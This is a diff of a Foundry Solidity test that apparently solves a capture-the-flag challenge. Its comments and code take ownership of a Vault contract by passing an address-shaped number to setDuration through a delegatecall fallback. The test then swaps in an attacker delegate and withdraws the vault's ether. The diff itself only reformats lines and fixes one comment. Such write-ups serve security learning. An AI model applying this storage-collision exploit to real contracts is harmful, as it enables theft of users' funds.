@@ -21,7 +21,7 @@ import "../src/Vesting.sol";
  *
  * To win this challenge, you have to take ownership of Vault.sol first
  * We can do this by executing function setDuration of Vesting.sol
- * However, theres one small obstacle: releaseDate is of type uint256,
+ * However, theres one small obstacle: duration is of type uint256,
  * but we need an address! Solution: We have to convert our address
  * to a number. This is done pretty easily, since addresses are basically
  * hexadecimal numbers (because of the require statement in setDuration
@@ -46,10 +46,7 @@ contract VaultTest is Test {
     // use address with leading zeros so setDuration() doesnt fail
     address alice = address(0x000ad5bc95DaB8328fCbB1D47e867A51fA3a802b);
 
-    event DelegateChanged(
-        address indexed previousDelegate,
-        address indexed newDelegate
-    );
+    event DelegateChanged(address indexed previousDelegate, address indexed newDelegate);
 
     function setUp() public {
         // deploy Vesting and Vault contract
@@ -79,18 +76,13 @@ contract VaultTest is Test {
          * Since Vault doesnt implement function setDuration(uint256), the fallback function
          * will be executed, which delegates the call to our Vesting contract
          */
-        vault.execute(
-            address(vault),
-            abi.encodeWithSignature("setDuration(uint256)", duration)
-        );
+        vault.execute(address(vault), abi.encodeWithSignature("setDuration(uint256)", duration));
 
         // alice should be owner now, change delegate to attack contract
         vault.upgradeDelegate(address(attacker));
 
         // delegatecall withdraw function from attacker contract
-        (bool success, ) = address(vault).call(
-            abi.encodeWithSignature("withdraw()")
-        );
+        (bool success,) = address(vault).call(abi.encodeWithSignature("withdraw()"));
         assertEq(success, true);
 
         // make sure alice has ether from Vault contract
